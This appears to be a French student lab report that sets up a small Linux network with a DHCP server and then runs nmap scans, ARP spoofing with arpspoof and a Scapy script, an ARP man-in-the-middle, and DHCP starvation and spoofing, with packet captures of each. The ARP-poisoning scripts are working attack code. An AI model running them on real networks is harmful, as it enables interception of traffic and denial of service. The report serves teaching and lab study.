# Configuration des Interfaces Réseau

# Fichiers de configuration des interfaces

# Node1
```bash
sudo cat /etc/sysconfig/network-scripts/ifcfg-ens18
```
```bash
DEVICE=ens18
NAME=LAN
ONBOOT=yes
BOOTPROTO=static
IPADDR=10.1.1.11
NETMASK=255.255.255.0
GATEWAY=10.1.1.254
```

# Node2
```bash
sudo cat /etc/sysconfig/network-scripts/ifcfg-ens18
```
```bash
DEVICE=ens18
NAME=LAN
ONBOOT=yes
BOOTPROTO=static
IPADDR=10.1.1.12
NETMASK=255.255.255.0
GATEWAY=10.1.1.254
```

# DHCP Server
```bash
sudo cat /etc/sysconfig/network-scripts/ifcfg-ens18
```
```bash
DEVICE=ens18
NAME=LAN
ONBOOT=yes
BOOTPROTO=static
IPADDR=10.1.1.253
NETMASK=255.255.255.0
GATEWAY=10.1.1.254
```

# Vérification des Adresses IP

```bash
ip a
```

# Vérification de la connectivité

```bash
ping 10.1.1.12 -c 4
```

# Capture du trafic réseau

```bash
sudo tcpdump -r ping_1.pcap
```

# Firewall

```bash
sudo firewall-cmd --list-all
```

# Fichier hosts

```bash
cat /etc/hosts
```
```bash
127.0.0.1   node1 node1.tp1.my
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.1.1.12   node2 node2.tp1.my
10.1.1.253  dhcp  dhcp.tp1.my
```

# Vérification de la résolution DNS

```bash
ping node2.tp1.my -c 4
```

# Manipulation de la table ARP

Afficher la table ARP :
```bash
ip neigh show dev ens18
```

Flush la table ARP :
```bash
sudo ip neigh flush all
```

Vérification après flush :
```bash
ip neigh show dev ens18
```

# Capture ARP

```bash
sudo tcpdump -i ens18 arp and \( host node1.tp1.my or host node2.tp1.my \) -w arp_1.pcap
```

Analyse du fichier de capture :
```bash
tcpdump -r arp_1.pcap
```

# Installation et configuration du serveur DHCP

Installation :
```bash
sudo dnf -y install dhcp-server
```

Édition du fichier de configuration :
```bash
sudo nano /etc/dhcp/dhcpd.conf
```

Configuration :
```bash
option domain-name "tp1.my";
option domain-name-servers 1.1.1.1;
default-lease-time 86400;
max-lease-time 172800;
authoritative;
subnet 10.1.1.0 netmask 255.255.255.0 {
    range dynamic-bootp 10.1.1.100 10.1.1.200;
    option broadcast-address 10.1.1.255;
}
```

# Capture des requêtes DHCP

```bash
sudo tcpdump -i ens18 -n port 67 or port 68 -w dhcp_1.pcap
```

Analyse des requêtes capturées :
```bash
tcpdump -r dhcp_1.pcap
```

# Vérification des baux DHCP

Serveur DHCP :
```bash
sudo cat /var/lib/dhcpd/dhcpd.leases
```

Client :
```bash
sudo cat /var/lib/dhclient/dhclient.leases
```

# Scan réseau avec Nmap

Scan ARP :
```bash
sudo nmap -sn 10.1.1.0/24 > nmap_1.pcap
```
Résultat de la commande : 

```bash
cat nmap_1.pcap
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-13 11:25 CET
Nmap scan report for 10.1.1.100
Host is up (0.00044s latency).
MAC Address: BC:24:11:DC:8B:E7 (Unknown)
Nmap scan report for dhcp (10.1.1.253)
Host is up (0.00023s latency).
MAC Address: BC:24:11:06:53:52 (Unknown)
Nmap scan report for 10.1.1.101
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.02 seconds
```
TCPDUMP sur la machine attaquée :

```bash
sudo tcpdump -i ens18 -n src host 10.1.1.101 -w nmap_1.pcap
```
Extrait du dump :

```bash
tcpdump -r nmap_1.pcap
reading from file nmap_1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
11:41:54.704684 ARP, Request who-has 10.1.1.1 tell 10.1.1.101, length 28
11:41:54.704695 ARP, Request who-has 10.1.1.2 tell 10.1.1.101, length 28
11:41:54.704696 ARP, Request who-has 10.1.1.3 tell 10.1.1.101, length 28
11:41:54.704697 ARP, Request who-has 10.1.1.4 tell 10.1.1.101, length 28
11:41:54.704698 ARP, Request who-has 10.1.1.5 tell 10.1.1.101, length 28
11:41:54.704699 ARP, Request who-has 10.1.1.6 tell 10.1.1.101, length 28
11:41:54.704700 ARP, Request who-has 10.1.1.7 tell 10.1.1.101, length 28
11:41:54.704700 ARP, Request who-has 10.1.1.8 tell 10.1.1.101, length 28
...
```

Scan détaillé d'un hôte :
```bash
sudo nmap -O -sV -sU -sS -p 0-100 10.1.1.253 > nmap_2.pcap
```

Analyse du résultat de nmap :
```bash
cat nmap_2.pcap
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-13 11:27 CET
Nmap scan report for dhcp (10.1.1.253)
Host is up (0.00042s latency).
Not shown: 99 filtered udp ports (admin-prohibited), 92 filtered tcp ports (no-response), 8 filtered tcp ports (admin-prohibited)
PORT   STATE         SERVICE VERSION
22/tcp open          ssh     OpenSSH 8.7 (protocol 2.0)
67/udp open|filtered dhcps
68/udp closed        dhcpc
MAC Address: BC:24:11:06:53:52 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.10 (95%), Linux 3.10 - 4.11 (95%), Linux 3.2 - 4.9 (95%), Linux 3.4 - 3.10 (95%), Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.4 (95%), Linux 5.1 (95%), Linux 2.6.32 - 3.10 (95%), Linux 2.6.32 - 3.13 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.68 seconds
```

TCPDUMP sur la machine attaquée :

```bash
sudo tcpdump -i ens18 -n src host 10.1.1.101
```

Extrait du dump : 

```bash
tcpdump -r nmap_2.pcap
reading from file nmap_2.pcap, link-type EN10MB (Ethernet), snapshot length 262144
11:49:37.021768 ARP, Request who-has dhcp tell 10.1.1.101, length 28
11:49:37.054107 IP 10.1.1.101.43837 > dhcp.smtp: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054109 IP 10.1.1.101.43837 > dhcp.http: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054110 IP 10.1.1.101.43837 > dhcp.ftp: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054110 IP 10.1.1.101.43837 > dhcp.ssh: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054110 IP 10.1.1.101.43837 > dhcp.domain: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054111 IP 10.1.1.101.43837 > dhcp.telnet: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054111 IP 10.1.1.101.43837 > dhcp.81: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054111 IP 10.1.1.101.43837 > dhcp.daytime: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054286 IP 10.1.1.101.43837 > dhcp.nsw-fe: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054286 IP 10.1.1.101.43837 > dhcp.dsp: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.054391 IP 10.1.1.101.43837 > dhcp.ssh: Flags [R], seq 331021431, win 0, length 0
11:49:37.056549 IP 10.1.1.101.43837 > dhcp.netstat: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056551 IP 10.1.1.101.43837 > dhcp.tacnews: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056552 IP 10.1.1.101.43837 > dhcp.75: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056552 IP 10.1.1.101.43837 > dhcp.nameserver: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056552 IP 10.1.1.101.43837 > dhcp.28: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056553 IP 10.1.1.101.43837 > dhcp.su-mit-tg: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056553 IP 10.1.1.101.43837 > dhcp.xns-ch: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056604 IP 10.1.1.101.43837 > dhcp.covia: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056604 IP 10.1.1.101.43837 > dhcp.nicname: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056605 IP 10.1.1.101.43837 > dhcp.netrjs-1: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056605 IP 10.1.1.101.43837 > dhcp.83: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056605 IP 10.1.1.101.43837 > dhcp.finger: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056627 IP 10.1.1.101.43837 > dhcp.netrjs-4: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:37.056628 IP 10.1.1.101.43837 > dhcp.8: Flags [S], seq 331021430, win 1024, options [mss 1460], length 0
11:49:38.155583 IP 10.1.1.101.43839 > dhcp.8: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155586 IP 10.1.1.101.43839 > dhcp.netrjs-4: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155586 IP 10.1.1.101.43839 > dhcp.finger: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155587 IP 10.1.1.101.43839 > dhcp.83: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155587 IP 10.1.1.101.43839 > dhcp.netrjs-1: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155587 IP 10.1.1.101.43839 > dhcp.nicname: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155588 IP 10.1.1.101.43839 > dhcp.covia: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155588 IP 10.1.1.101.43839 > dhcp.xns-ch: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155741 IP 10.1.1.101.43839 > dhcp.su-mit-tg: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155742 IP 10.1.1.101.43839 > dhcp.28: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155760 IP 10.1.1.101.43839 > dhcp.nameserver: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155760 IP 10.1.1.101.43839 > dhcp.75: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
11:49:38.155761 IP 10.1.1.101.43839 > dhcp.tacnews: Flags [S], seq 330890356, win 1024, options [mss 1460], length 0
...
```

# Spoof ARP

Commande de spoof ARP en se passant pour le dhcp vers le node2 :
```bash
sudo arpspoof -i ens18 -t 10.1.1.100 10.1.1.253
```
Table ARP depuis node2.tp1.my pour voir les fausses infos :
```bash
ip neigh show dev ens18
10.1.1.253 lladdr bc:24:11:e6:a3:35 REACHABLE
10.1.1.101 lladdr bc:24:11:e6:a3:35 STALE
```

Capture des packets ARP sur node2 pour voir l'attaque : 
```bash
sudo tcpdump -i ens18 arp and \( host 10.1.1.101 or host 10.1.1.100 \) -w arp_spoof_1.pcap

#Affichage du résultat :
tcpdump -r arp_spoof_1.pcap
reading from file arp_spoof_1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
10:29:44.006397 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:29:46.006708 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:29:48.007206 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:29:50.007500 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:29:52.007851 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:29:54.008139 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:29:56.008568 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:29:58.008767 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:30:00.008999 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
10:30:02.009289 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
```

# Ecrire un script Scapy qui fait le travail de arpspoof

Exemple d'exécution du script : 
```bash
sudo python3 arp_spoof.py
^C
[+] Stopping ARP Spoofing
```

Script python de spoofing ARP :
```python
from scapy.all import *
import time

# Définition des paramètres
ip_cible = "10.1.1.100"   # Cible
ip_dhcp = "10.1.1.253"   # IP usurpée (passerelle)
mac_cible = "bc:24:11:dc:8b:e7"    # MAC de la cible

# Spécification de l'interface réseau
interface = "ens18"  # Remplace par eth0, eth1, etc., selon ton réseau

# Création du paquet ARP Spoofing avec la couche Ethernet
packet = Ether(dst=mac_cible) / ARP(op=2, pdst=ip_cible, hwdst=mac_cible, p>

try:
    while True:
        sendp(packet, iface=interface, verbose=False)  # Envoi en précisant>        time.sleep(2)  # Pause pour maintenir l'empoisonnement
except KeyboardInterrupt:
    print("\n[+] Stopping ARP Spoofing")
```

Affichage table ARP de la victime après execution du script : 

```bash
ip n s dev ens18
10.1.1.253 lladdr bc:24:11:e6:a3:35 REACHABLE
10.1.1.101 lladdr bc:24:11:e6:a3:35 STALE
```

Captures sur node2 des packets générés par le script python : 

```bash
sudo tcpdump -i ens18 arp and \( host 10.1.1.101 or host 10.1.1.100 \) -w arp_spoof_2.pcap

#Affichage du résultat :
tcpdump -r arp_spoof_2.pcap
reading from file arp_spoof_2.pcap, link-type EN10MB (Ethernet), snapshot length 262144
11:57:40.539172 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:42.557150 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:44.579128 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:46.600130 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:48.618213 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:50.636144 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:52.651963 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:54.672134 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:56.688183 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:57:58.704040 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:58:00.720981 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:58:02.734049 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
11:58:04.754821 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
```

# Mettre en place un MITM ARP :

Script python pour usurper la mac du node2 sur le dhcp

```python
ip_cible = "10.1.1.253"   # Cible
ip_usurpee = "10.1.1.100"   # IP usurpée (passerelle)
mac_cible = "bc:24:11:06:53:52"    # MAC de la cible

# Spécification de l'interface réseau
interface = "ens18"  # Remplace par eth0, eth1, etc., selon ton réseau

# Création du paquet ARP Spoofing avec la couche Ethernet
packet = Ether(dst=mac_cible) / ARP(op=2, pdst=ip_cible, hwdst=mac_cible, psrc=ip_usurpee)

try:
    while True:
        sendp(packet, iface=interface, verbose=False)  # Envoi en précisant l'interface réseau
        time.sleep(2)  # Pause pour maintenir l'empoisonnement
except KeyboardInterrupt:
    print("\n[+] Stopping ARP Spoofing")
```

Script python pour usurper la mac du dhcp sur le node2 :

```python
from scapy.all import *
import time

# Définition des paramètres
ip_cible = "10.1.1.100"   # Cible
ip_usurpee = "10.1.1.253"   # IP usurpée (passerelle)
mac_cible = "bc:24:11:dc:8b:e7"    # MAC de la cible

# Spécification de l'interface réseau
interface = "ens18"  # Remplace par eth0, eth1, etc., selon ton réseau

# Création du paquet ARP Spoofing avec la couche Ethernet
packet = Ether(dst=mac_cible) / ARP(op=2, pdst=ip_cible, hwdst=mac_cible, psrc=ip_usurpee)

try:
    while True:
        sendp(packet, iface=interface, verbose=False)  # Envoi en précisant l'interface réseau
        time.sleep(2)  # Pause pour maintenir l'empoisonnement
except KeyboardInterrupt:
    print("\n[+] Stopping ARP Spoofing")
```

Capture sur node1 qui récupere le ping du node2 vers le dhcp + ARP Spoofing en sortie des scripts :

```bash
tcpdump -r arp_mitm_1.pcap
reading from file arp_mitm_1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
14:24:17.488802 ARP, Reply 10.1.1.100 is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
14:24:17.575273 IP 10.1.1.100 > dhcp: ICMP echo request, id 1, seq 56, length 64
14:24:17.575321 IP node1 > dhcp: ICMP echo request, id 1, seq 56, length 64
14:24:17.575749 IP dhcp > node1: ICMP echo reply, id 1, seq 56, length 64
14:24:17.575763 IP dhcp > 10.1.1.100: ICMP echo reply, id 1, seq 56, length 64
14:24:18.350051 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
14:24:18.576355 IP 10.1.1.100 > dhcp: ICMP echo request, id 1, seq 57, length 64
14:24:18.576395 IP node1 > dhcp: ICMP echo request, id 1, seq 57, length 64
14:24:18.576710 IP dhcp > node1: ICMP echo reply, id 1, seq 57, length 64
14:24:18.576722 IP dhcp > 10.1.1.100: ICMP echo reply, id 1, seq 57, length 64
14:24:19.503004 ARP, Reply 10.1.1.100 is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
14:24:19.604852 IP 10.1.1.100 > dhcp: ICMP echo request, id 1, seq 58, length 64
14:24:19.604884 IP node1 > dhcp: ICMP echo request, id 1, seq 58, length 64
14:24:19.605174 IP dhcp > node1: ICMP echo reply, id 1, seq 58, length 64
14:24:19.605185 IP dhcp > 10.1.1.100: ICMP echo reply, id 1, seq 58, length 64
14:24:20.364916 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
14:24:20.628764 IP 10.1.1.100 > dhcp: ICMP echo request, id 1, seq 59, length 64
14:24:20.628797 IP node1 > dhcp: ICMP echo request, id 1, seq 59, length 64
14:24:20.629098 IP dhcp > node1: ICMP echo reply, id 1, seq 59, length 64
14:24:20.629109 IP dhcp > 10.1.1.100: ICMP echo reply, id 1, seq 59, length 64
14:24:21.517900 ARP, Reply 10.1.1.100 is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
14:24:21.652889 IP 10.1.1.100 > dhcp: ICMP echo request, id 1, seq 60, length 64
14:24:21.652937 IP node1 > dhcp: ICMP echo request, id 1, seq 60, length 64
14:24:21.653459 IP dhcp > node1: ICMP echo reply, id 1, seq 60, length 64
14:24:21.653490 IP dhcp > 10.1.1.100: ICMP echo reply, id 1, seq 60, length 64
14:24:22.378848 ARP, Reply dhcp is-at bc:24:11:e6:a3:35 (oui Unknown), length 28
14:24:22.654087 IP 10.1.1.100 > dhcp: ICMP echo request, id 1, seq 61, length 64
14:24:22.654140 IP node1 > dhcp: ICMP echo request, id 1, seq 61, length 64
14:24:22.654439 IP dhcp > node1: ICMP echo reply, id 1, seq 61, length 64
14:24:22.654452 IP dhcp > 10.1.1.100: ICMP echo reply, id 1, seq 61, length 64
...
```

# DHCP starvation

## Go Scapy go

Script présent dans le dépot GIT

Affichage des bails de dhcp.tp1.my sur node1.tp1.my

```bash
cat /var/lib/dhcpd/dhcpd.leases | grep lease | wc -l
100
```
Capture sur dhcp qui répond aux multiples demandes de MAC simulées par node1 :

```bash
sudo tcpdump -i ens18 port 67 or port 68 -w dhcp_starvation_1.pcap

tcpdump -r dhcp_starvation_1.pcap
reading from file dhcp_starvation_1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
18:40:00.654107 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:6f:58:a5:60:7b (oui Unknown), length 244
18:40:03.691235 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:6c:63:a7:8c:ff (oui Unknown), length 244
18:40:06.718004 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:2b:01:3d:21:86 (oui Unknown), length 244
18:40:07.719567 IP dhcp.bootps > 10.1.1.102.bootpc: BOOTP/DHCP, Reply, length 300
18:40:07.733164 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:2b:01:3d:21:86 (oui Unknown), length 256
18:40:07.744643 IP dhcp.bootps > 10.1.1.102.bootpc: BOOTP/DHCP, Reply, length 300
18:40:07.748849 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:4d:58:44:cb:05 (oui Unknown), length 244
18:40:08.750272 IP dhcp.bootps > 10.1.1.103.bootpc: BOOTP/DHCP, Reply, length 300
18:40:08.765163 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:4d:58:44:cb:05 (oui Unknown), length 256
18:40:08.772578 IP dhcp.bootps > 10.1.1.103.bootpc: BOOTP/DHCP, Reply, length 300
18:40:08.783211 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:37:f8:e2:a7:a7 (oui Unknown), length 244
18:40:09.784635 IP dhcp.bootps > 10.1.1.104.bootpc: BOOTP/DHCP, Reply, length 300
18:40:09.801074 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:37:f8:e2:a7:a7 (oui Unknown), length 256
18:40:09.824256 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:26:e5:8f:18:10 (oui Unknown), length 244
18:40:09.876886 IP dhcp.bootps > 10.1.1.104.bootpc: BOOTP/DHCP, Reply, length 300
18:40:09.896134 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 02:3c:40:aa:d1:f0 (oui Unknown), length 244
18:40:10.877383 IP dhcp.bootps > 10.1.1.105.bootpc: BOOTP/DHCP, Reply, length 300
...
```

Preuve de DOS du réseau

```bash
sudo nmcli connection up LAN
Error: Connection activation failed: IP configuration could not be reserved (no available address, timeout, etc.)
Hint: use 'journalctl -xe NM_CONNECTION=d43b7a46-0dff-9d53-1068-ccc58c977db3 + NM_DEVICE=ens18' to get more details.
```

Capture DOS réseau

Capturer les trames échangée entre le client et le serveur DHCP

```bash
sudo tcpdump -i ens18 '(port 67 or port 68) and ether host bc:24:11:dc:8b:e7' -w dhcp_starvation_2.pcap

tcpdump -r dhcp_starvation_2.pcap
reading from file dhcp_starvation_2.pcap, link-type EN10MB (Ethernet), snapshot length 262144
18:51:59.113105 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:51:59.113969 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:01.897213 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:06.694230 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:15.293803 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:32.146723 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:44.897344 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:44.897999 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:47.110922 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
18:52:51.164458 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
```

## DHCP spoofing

Script présent dans le dépot GIT

Capture trames envoyées par le script dhcp_spoofing.py sur node2

```bash
sudo tcpdump -i ens18 -w dhcp_spoofing_1.pcap 'udp and (port 67 or port 68) and (ether host bc:24:11:dc:8b:e7 or host 10.1.1.101 or host 10.1.1.253)'

tcpdump -r dhcp_spoofing_1.pcap
reading from file dhcp_spoofing_1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
19:24:11.153297 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
19:24:11.164442 IP _gateway.bootps > 255.255.255.255.bootpc: BOOTP/DHCP, Reply, length 274
19:24:12.958760 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from bc:24:11:dc:8b:e7 (oui Unknown), length 289
19:24:12.966557 IP _gateway.bootps > 255.255.255.255.bootpc: BOOTP/DHCP, Reply, length 274
```

Afficher, depuis la victime :

```bash
ip a show ens18
2: ens18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether bc:24:11:dc:8b:e7 brd ff:ff:ff:ff:ff:ff
    altname enp0s18
    inet 10.1.1.37/24 brd 10.1.1.255 scope global dynamic noprefixroute ens18
       valid_lft 3351sec preferred_lft 3351sec
    inet6 fe80::be24:11ff:fedc:8be7/64 scope link
       valid_lft forever preferred_lft forever
```

## MITM again

Capture à partir de node2 ping 1.1.1.1 :

```bash
sudo tcpdump -i ens18 -w dhcp_spoofing_2.pcap '(icmp and host 1.1.1.1) and (ether host bc:24:11:dc:8b:e7 or host 10.1.1.101)'

tcpdump -r dhcp_spoofing_2.pcap
reading from file dhcp_spoofing_2.pcap, link-type EN10MB (Ethernet), snapshot length 262144
20:04:44.211916 IP node2 > one.one.one.one: ICMP echo request, id 10, seq 1, length 64
20:04:44.213100 IP one.one.one.one > node2: ICMP echo reply, id 10, seq 1, length 64
20:04:45.213355 IP node2 > one.one.one.one: ICMP echo request, id 10, seq 2, length 64
20:04:45.215128 IP one.one.one.one > node2: ICMP echo reply, id 10, seq 2, length 64
20:04:46.215429 IP node2 > one.one.one.one: ICMP echo request, id 10, seq 3, length 64
20:04:46.217797 IP one.one.one.one > node2: ICMP echo reply, id 10, seq 3, length 64
20:04:47.217062 IP node2 > one.one.one.one: ICMP echo request, id 10, seq 4, length 64
20:04:47.218349 IP one.one.one.one > node2: ICMP echo reply, id 10, seq 4, length 64
20:04:48.218688 IP node2 > one.one.one.one: ICMP echo request, id 10, seq 5, length 64
20:04:48.220077 IP one.one.one.one > node2: ICMP echo reply, id 10, seq 5, length 64
20:04:49.220442 IP node2 > one.one.one.one: ICMP echo request, id 10, seq 6, length 64
20:04:49.221734 IP one.one.one.one > node2: ICMP echo reply, id 10, seq 6, length 64
```